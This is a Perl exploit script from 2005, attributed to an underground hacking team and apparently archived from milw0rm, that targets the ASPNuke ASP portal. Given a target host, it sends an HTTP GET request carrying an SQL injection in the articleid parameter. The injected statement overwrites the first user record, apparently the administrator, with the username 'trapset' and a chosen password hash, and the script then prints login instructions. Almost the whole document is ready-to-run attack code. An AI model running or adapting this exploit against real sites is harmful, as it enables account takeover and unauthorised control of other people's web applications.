#!/usr/bin/perl
######################################################################################
#        T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m
######################################################################################
# EXPLOIT FOR: ASPNuke ASP Portal
#
# Expl0it By: mh_p0rtal@Yahoo.com
#
# Discovered By: Trap-Set Underground Hacking Team (oil_KarchacK)
#
######################################################################################
#  GR33tz T0 ==>    Alpha_programmer  --  oil_Karchack  --  the_CephaleX  -- Str0ke
#  And Iranian Security & Technical Sites:
#  IHS TeaM , alphaST , Shabgard Security Team  , Emperor Hacking Team  ,
#  Crouz Security Team , Hat-squad security team  & Simorgh-ev Security Team
######################################################################################
use IO::Socket;

if (@ARGV < 1)
{
 print "\n==========================================\n";
 print " \n     -- Exploit By mh_p0rtal --\n\n";
 print "     Trap-Set Underground Hacking Team      \n\n";
 print "         Usage:ASPNuke.pl <T4rg3t> \n\n";
 print "==========================================\n\n";
 print "Examples:\n\n";
 print "   ASPNuke.pl www.Site.com \n";
 exit();
}

my $host = $ARGV[0];
my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host,
PeerPort => "80" );

unless ($remote) { die "C4nn0t C0nn3ct to $host" }

print "[+]C0nn3cted\n";

$addr = "GET /module/article/article/article.asp?articleid=1%20;%20update%20tbluser%20SET%20password='bf16c7ec063e8f1b62bf4ca831485ba0da56328f818763ed34c72ca96533802c'%20,%20username='trapset'%20where%20userID=1%20-- HTTP/1.0\n";
$addr .= "Host: $host\n\n\n\n";
print "\n";
print $remote $addr;
print "[+]Wait...";
sleep(5);
print "Wait For Changing Password ...\n";

print "[+]OK , Now Login With : \n";
print "Username: trapset\n";
print "Password: trapset\n\n";


# milw0rm.com [2005-06-27]